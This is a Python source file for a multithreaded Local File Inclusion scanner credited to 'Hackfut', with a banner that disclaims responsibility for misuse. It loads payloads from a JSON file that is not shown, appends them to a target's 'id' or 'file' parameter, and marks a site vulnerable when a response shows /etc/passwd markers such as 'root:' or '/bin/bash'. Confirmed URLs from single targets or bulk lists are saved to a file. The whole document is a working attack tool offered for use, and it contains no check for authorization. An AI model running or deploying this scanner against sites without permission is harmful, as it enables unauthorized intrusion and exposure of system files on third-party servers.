import os
import requests
import json
import threading
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed

# Clear the terminal
os.system('cls' if os.name == 'nt' else 'clear')

# Banner
banner = """\033[0;32m
          
          #Author  : Hackfut
          #Contact : t.me/HackfutSec
          #Github  : https://github.com/HackfutSec
          #License : MIT  
          [Warning] I am not responsible for the way you will use this program [Warning]

                    ██╗░░░░░██████╗░██╗░░░██╗███╗░░░███╗██████╗░
                    ██║░░░░░██╔══██╗██║░░░██║████╗░████║██╔══██╗
                    ██║░░░░░██║░░██║██║░░░██║██╔████╔██║██████╔╝
                    ██║░░░░░██║░░██║██║░░░██║██║╚██╔╝██║██╔═══╝░
                    ███████╗██████╔╝╚██████╔╝██║░╚═╝░██║██║░░░░░
                    ╚══════╝╚═════╝░░╚═════╝░╚═╝░░░░░╚═╝╚═╝░░░░░
                    🅛🅕🅘    🅛🅕🅘     🅛🅕🅘    🅛🅕🅘  🅛🅕🅘  🅛🅕🅘 🅛🅕🅘 🅛🅕🅘

                    Description:
                    This Python script is an LFI (Local File Inclusion) vulnerability scanner. 
                    It loads payloads from a JSON file, modifies URLs to test vulnerable parameters, 
                    and sends HTTP requests to detect potential LFI issues by checking for system-level file indicators (e.g., /bin/bash). 
                    The script uses multithreading for faster testing of multiple URLs in parallel. Results are saved in LFi.txt, and errors are logged in errors.log.
"""


# Colors
YELLOW_BOLD = "\033[1;33m"
WHITE_BOLD = "\033[1;37m"
GREEN_BOLD = "\033[1;32m"
RED_BOLD = "\033[1;31m"
RESET = "\033[0m"

# Headers
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
headers = {"User-Agent": USER_AGENT}

# Locks
file_lock = threading.Lock()
error_lock = threading.Lock()

# Load payloads
def load_payloads(file):
    try:
        with open(file, 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        print(f"{RED_BOLD}\n[✘]Error:{RESET} Payload file not found.")
        exit(1)

# Sanitize URL
def sanitize_url(url, option):
    parsed_url = urlparse(url)
    if option == 1:
        query = parse_qs(parsed_url.query)
        if 'id' in query:
            query['id'] = ['']
        sanitized_query = urlencode(query, doseq=True)
        return urlunparse(parsed_url._replace(query=sanitized_query))
    else:
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        return f"{base_url}?file="

# Test LFI
def test_lfi(urls, payloads, output_file, option, max_workers=10):
    futures = []
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        for base_url in urls:
            sanitized_url = sanitize_url(base_url, option)
            for payload in payloads:
                full_url = f"{sanitized_url}{payload}"
                futures.append(executor.submit(check_vulnerability, full_url, output_file))
        
        for future in as_completed(futures):
            future.result()

# Check vulnerability
def check_vulnerability(url, output_file):
    try:
        response = requests.get(url, headers=headers, timeout=5)
        if response.status_code == 200 and ("root:" in response.text or "/bin/bash" in response.text):
            with file_lock:
                with open(output_file, 'a') as f:
                    f.write(url + '\n')
            print(f"\n{YELLOW_BOLD}[>>]{RESET} {WHITE_BOLD}{url}{RESET} --> {GREEN_BOLD}[Vuln]{RESET}")
        else:
            print(f"\n{RED_BOLD}[x]{RESET} {WHITE_BOLD}{url}{RESET} --> {RED_BOLD}[Not Vuln]{RESET}")
    except requests.RequestException as e:
        with error_lock:
            with open('errors.log', 'a') as f:
                f.write(f"{url} - {e}\n")
        print(f"\n[✘]{RED_BOLD}Request failed:{RESET} {e}")

# Main function
def main():
    print(banner)

    # Ask user to choose between single URL or list
    choice = input(f"\n{YELLOW_BOLD}\nDo you want to test:\n\n(1) single URL\n(2) list of URLs\n\n[<<] Choose (1/2): {RESET}").strip()

    if choice == '2':
        # Handle list of URLs
        urls_file = input(f"\n[] {YELLOW_BOLD}Give me your URL list file: {RESET}").strip()
        
        if not os.path.isfile(urls_file):
            print(f"\n[✘] {RED_BOLD}Error:{RESET} The provided URL list file does not exist.")
            exit(1)
        
        with open(urls_file, 'r') as f:
            urls = [line.strip() for line in f if line.strip()]
    elif choice == '1':
        # Handle single URL
        urls = [input(f"\n[✘] {YELLOW_BOLD}Enter the single URL to test: {RESET}").strip()]
    else:
        print(f"\n[✘] {RED_BOLD}Error:{RESET} Invalid choice. Please choose '1' for single URL or '2' for list of URLs.")
        exit(1)

    payloads_file = 'payloads.json'
    output_file = 'LFi.txt'
    
    payloads = load_payloads(payloads_file)
    
    try:
        option = int(input(f"\n[✓] {YELLOW_BOLD}Choose option:\n\n1: Keep URL\n2: Replace with ?file=\n\n[<<] Your choice: {RESET}") or 1)
        if option not in [1, 2]:
            print(f"\n[✘] {RED_BOLD}Error:{RESET} Invalid option. Please choose 1 or 2.")
            exit(1)
    except ValueError:
        print(f"\n[✘] {RED_BOLD}Error:{RESET} Invalid input. Please enter a valid number (1 or 2).")
        exit(1)

    try:
        max_workers = int(input(f"\n[✓] {YELLOW_BOLD}Number of Threads (default 10): {RESET}") or 10)
        if max_workers <= 0:
            print(f"\n[✘] {RED_BOLD}Error:{RESET} Number of threads must be a positive integer.")
            exit(1)
    except ValueError:
        print(f"\n[✘] {RED_BOLD}Error:{RESET} Invalid input. Please enter a valid number for threads.")
        exit(1)
    
    test_lfi(urls, payloads, output_file, option, max_workers)
    print(f"\n[✓] {GREEN_BOLD}Scan completed. Results saved to {output_file}{RESET}")
    print(f"\n[✘] {YELLOW_BOLD}Errors (if any) logged in errors.log{RESET}")

if __name__ == '__main__':
    main()
